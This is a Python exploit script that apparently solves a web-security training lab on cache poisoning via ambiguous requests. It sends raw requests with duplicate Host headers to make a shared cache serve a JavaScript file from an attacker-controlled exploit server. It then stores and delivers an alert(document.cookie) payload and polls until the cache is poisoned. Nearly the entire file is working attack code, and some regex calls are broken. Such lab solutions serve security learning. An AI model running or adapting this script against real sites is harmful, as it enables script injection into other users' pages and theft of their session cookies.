# Web cache poisoning via ambiguous requests

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import ssl
import socket

TIMEOUT = 5
warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def send_payload(s, url, payload, attacker):
	post_exploit_path = attacker
	post_exploit_data = {
		"formAction": "STORE",
		"urlIsHttps": "on",
		"responseFile": "/resources/js/tracking.js",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8""",
		"responseBody": payload
	}
	r = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(1)
	post_exploit_data = {
		"formAction": "DELIVER_TO_VICTIM",
		"urlIsHttps": "on",
		"responseFile": "/resources/js/tracking.js",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8""",
		"responseBody": payload
	}
	r = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(1)
	print('\n[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('\n[+] Using payload:\n%s' % payload)
	print('\n[+] Delivered to the victim via:\t%s' % post_exploit_path + post_exploit_data['responseFile'])
	return r

def build_request(url, attacker, lab_cookie, session_cookie=''):
	request_content = 'GET / HTTP/1.1\r\n'
	request_content += 'Cookie: _lab=' + lab_cookie + '; session=' + session_cookie + ';\r\n'
	request_content += 'Host: ' + url + '\r\n'
	request_content += 'Host: ' + attacker
	request_content += '\r\n'
	request_content += '\r\n'
	request_content += '\r\n'
	print("------------------------------------------------------")
	print(request_content)
	print("------------------------------------------------------\n")
	return request_content

def build_cb_request(url, attacker, lab_cookie, session_cookie):
	request_content = 'GET /?cb=123 HTTP/1.1\r\n'
	request_content += 'Cookie: _lab=' + lab_cookie + '; session=' + session_cookie + ';\r\n'
	request_content += 'Host: ' + url + '\r\n'
	request_content += 'Host: ' + attacker
	request_content += '\r\n'
	request_content += '\r\n'
	print("------------------------------------------------------")
	print(request_content)
	print("------------------------------------------------------\n")
	return request_content


def send_req(request_content, host, port):
	context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
	context.check_hostname = False
	context.verify_mode = ssl.CERT_NONE
	socket.setdefaulttimeout(TIMEOUT)
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock = context.wrap_socket(sock, server_hostname=host)
	sock.connect((host, port))
	sock.sendall(request_content.encode())
	resp = sock.recv(256)
	sock.close()
	return resp.decode().split('\r\n\r\n')[0]

def send_sequence(s, url, attacker):
	lab_cookie = s.cookies['_lab']
	if s.cookies['session']:
		session_cookie = s.cookies['session']
	host = url.replace('https://', '')
	solved = False
	while solved == False:
		print('\n[+] Sending cache poisoning request...')
		req_cb = build_cb_request(host, attacker, lab_cookie, session_cookie)
		r = send_req(req_cb, host, 443)
		print("RESPONSE:")
		print(r)
		if 'session=' in r:
			session_cookie = re.search(r'Set-Cookie: session=(.*); Secure')
		time.sleep(2)
		if 'X-Cache: hit' in r:
			req = build_request(host, attacker, lab_cookie, session_cookie)
			r = send_req(req, host, 443)
			if 'session=' in r:
				session_cookie = re.search(r'Set-Cookie: session=(.*); Secure')
			print("RESPONSE:")
			print(r)
			if "X-Cache: hit" in r:
				print('[+] Cache poisoned')
				print('[+] Waiting %s seconds before retry...' % str(30 - int(re.search(r'Age: (.*)\r\n', r).group(1))))
				time.sleep(30 - int(re.search(r'Age: (.*)\r\n', r).group(1)))
				r = s.get(url)
				if 'Congratulations, you solved the lab!' in r.text:
					print('\n[+] The lab is solved !')
					solved = True
					break
			else:
				print('[+] Received "X-cache: miss"...')
				time.sleep(2)

def send_cache_poisoning(s, url, attacker):
	file_path = url + '/resources/js/tracking.js'
	exploit_body = "alert(document.cookie)"
	r = send_payload(s, file_path, exploit_body, 'https://' + attacker)
	if r.status_code != 200:
		print('[-] The exploit failed to store the payload...')
		sys.exit(1)
	send_sequence(s, url, attacker)
	return r

def find_exploit_srv(r):
	if re.search(r"href='(.*)'>Go to exploit server", r.text):
		srv = re.search(r"href='(.*)'>Go to exploit server", r.text).group(1)
		print('[+] Found Exploit server:\n\t%s' % srv)
		return srv

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Web cache poisoning via ambiguous requests')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	# s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		exploit_srv = find_exploit_srv(r)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to send Web Cache Poisoning attack...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			parsed_atk = urllib.parse.urlparse(exploit_srv)
			if parsed_atk.netloc == b'':
				print('[-] Cannot find exploit server... Already solved <!>')
				sys.exit(1)
			attacker = parsed_atk.scheme + '://' + parsed_atk.netloc
			send_cache_poisoning(s, url, parsed_atk.netloc)

	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
